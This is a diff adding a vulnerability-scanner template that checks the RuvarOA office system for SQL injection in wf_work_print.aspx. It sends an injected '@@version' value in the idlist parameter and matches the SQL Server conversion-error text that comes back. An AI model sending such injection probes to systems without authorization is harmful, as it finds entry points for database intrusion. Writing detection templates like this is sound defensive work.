@@ -1,0 +1,22 @@
+id: poc-yaml-ruvaroa-wf-work-print-aspx-sqli
+info:
+  name: RuvarOA wf_work_print.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, ruvar-oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WorkFlow/wf_work_print.aspx?idlist=@@version"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "Microsoft SQL Server"
+        part: body
